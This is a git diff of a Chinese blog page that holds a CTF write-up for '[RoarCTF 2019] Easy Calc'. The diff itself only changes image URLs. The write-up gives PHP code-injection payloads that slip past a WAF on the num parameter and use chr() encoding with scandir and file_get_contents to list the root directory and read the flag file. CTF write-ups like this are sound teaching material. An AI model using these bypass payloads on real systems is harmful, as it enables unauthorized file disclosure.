@@ -228,9 +228,9 @@
             
             <div class="markdown-body">
               <h2 id="九、"><a href="#九、" class="headerlink" title="九、"></a>九、</h2><ul>
-<li>题目：[RoarCTF 2019]Easy Calc<br>打开靶场，一个简单的计算器，在源代码中发现一些东西<br><img src="https://raw.githubusercontent.com/lll-nnn/lll-nnn.github.io/master/picgo/20210123183527.png" srcset="/img/loading.gif"><br>WAF和calc.php,访问calca.php<br><img src="https://raw.githubusercontent.com/lll-nnn/lll-nnn.github.io/master/picgo/20210123183726.png" srcset="/img/loading.gif"></li>
+<li>题目：[RoarCTF 2019]Easy Calc<br>打开靶场，一个简单的计算器，在源代码中发现一些东西<br><img src="https://ftp.bmp.ovh/imgs/2021/01/b4957385a1f70127.png" srcset="/img/loading.gif"><br>WAF和calc.php,访问calca.php<br><img src="https://ftp.bmp.ovh/imgs/2021/01/f7627cb41a97cb9f.png" srcset="/img/loading.gif"></li>
 <li>分析<br>本来以为是个简单的命令执行，但是我错了，输入num的值，发现不能输入字母，只能是数字或者运算符，才会有回显，<code>WAF</code><br>看了别人的wp说num前加括号可以绕过<br>然后输入<code> num=system(chr(39).ls.chr(39))</code>什么也没有，看了下<code> num=phpinfo()</code>发现system和其他一些函数被禁了,使用scandir,过滤的字符可以用chr编码         </li>
-<li>解<br><code> num=var_dump(scandir(chr(47)))</code><br><img src="https://raw.githubusercontent.com/lll-nnn/lll-nnn.github.io/master/picgo/20210123185447.png" srcset="/img/loading.gif"><br>打开f1agg：<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>得到flag<br><img src="https://raw.githubusercontent.com/lll-nnn/lll-nnn.github.io/master/picgo/20210123185454.png" srcset="/img/loading.gif">                   </li>
+<li>解<br><code> num=var_dump(scandir(chr(47)))</code><br><img src="https://ftp.bmp.ovh/imgs/2021/01/84d49bb08cefae0b.png" srcset="/img/loading.gif"><br>打开f1agg：<code>? num=var_dump(file_get_contents(chr(47).chr(102).chr(49).chr(97).chr(103).chr(103)))</code>得到flag<br><img src="https://ftp.bmp.ovh/imgs/2021/01/d884c9d3fdbf9cb9.png" srcset="/img/loading.gif">                  </li>
 <li>知识点         </li>
 <li>*几个函数：**      <blockquote>
 <p><code>scandir</code> — 列出指定路径中的文件和目录,返回一个数组<br><code>file_get_contents</code> — 将整个文件读入一个字符串<br><code>var_dump</code> — 打印变量的相关信息        </p>
